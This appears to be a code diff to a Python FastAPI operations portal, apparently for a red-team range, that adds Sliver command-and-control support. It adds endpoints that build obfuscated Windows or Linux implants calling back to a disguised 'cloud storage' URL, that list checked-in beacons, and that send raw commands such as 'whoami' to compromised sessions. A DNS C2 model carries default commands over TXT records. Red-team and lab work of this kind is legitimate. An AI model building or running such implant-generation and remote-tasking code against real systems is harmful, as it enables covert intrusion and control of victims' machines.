@@ -350,6 +350,41 @@ def ops_havoc_task(demon_id: str, command: str,
         raise HTTPException(status_code=502, detail=str(exc)) from exc
 
 
+class SliverGenerateRequest(BaseModel):
+    kind: str = Field("session", description="beacon | session (sessions are "
+                                             "taskable immediately; beacons need "
+                                             "`interactive` first)")
+    c2_url: str = Field("192.168.77.1:80/cloud/storage/objects",
+                        description="Implant callback URL (redirector prefix)")
+    target_os: str = Field("windows", description="windows | linux")
+    arch: str = Field("amd64", description="amd64 | 386")
+
+
+@app.get("/api/ops/sliver/beacons")
+def ops_sliver_beacons() -> dict[str, Any]:
+    """Checked-in Sliver beacons (read-only: beacons take no direct tasks)."""
+    import sliver_client as sc
+    try:
+        return {"ok": True, "beacons": sc.beacons()}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
+@app.post("/api/ops/sliver/generate")
+def ops_sliver_generate(req: SliverGenerateRequest) -> dict[str, Any]:
+    """Build a Sliver implant server-side (garble compile, ~40s+).
+
+    The 48 MB binary stays in the sliver container; the response carries the
+    `docker cp` retrieval command instead of a giant base64 body.
+    """
+    import sliver_client as sc
+    try:
+        return {"ok": True, **sc.generate(req.kind, req.c2_url,
+                                          req.target_os, req.arch)}
+    except cb.BackendError as exc:
+        raise HTTPException(status_code=502, detail=str(exc)) from exc
+
+
 class DnsDissectRequest(BaseModel):
     payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
     domain_suffix: str = Field(default="c2.cadre.local", description="DNS C2 zone suffix")
@@ -738,7 +773,7 @@ import c2backends as cb  # noqa: E402
 
 class TaskRequest(BaseModel):
     session_id: str = Field(..., description="Session/callback id")
-    backend: str = Field(..., description="meridian | mythic | havoc | adaptix")
+    backend: str = Field(..., description="meridian | mythic | havoc | adaptix | sliver")
     command: str = Field(..., description="Raw command line (alias commands take "
                                            "a plain string, not JSON)")
     callback_id: int | None = Field(None, description="Mythic callback id")
@@ -820,6 +855,10 @@ def ops_task(req: TaskRequest) -> dict[str, Any]:
                 shell <cmdline>, powershell <cmdline>)
       havoc     a shell command line; the portal wraps it in the ProcModule
                 task the GUI builds
+      sliver    a program + arguments line, executed directly with NO shell
+                (no `>`, `|`, `&&`). For shell features wrap explicitly, e.g.
+                `cmd.exe "/c whoami > C:\\out.txt"`. Sessions only: beacons
+                cannot be tasked with --use.
     """
     try:
         if req.backend == "meridian":
@@ -845,6 +884,10 @@ def ops_task(req: TaskRequest) -> dict[str, Any]:
             return {"ok": True, "backend": "havoc",
                     "result": hv._run(hv.HavocClient().task(
                         req.session_id, req.command, wait=float(req.wait)))}
+        if req.backend == "sliver":
+            import sliver_client as sc
+            return {"ok": True, "backend": "sliver",
+                    "result": sc.task(req.session_id, req.command)}
         raise HTTPException(status_code=400,
                             detail=f"unsupported backend '{req.backend}'")
     except cb.BackendError as exc:
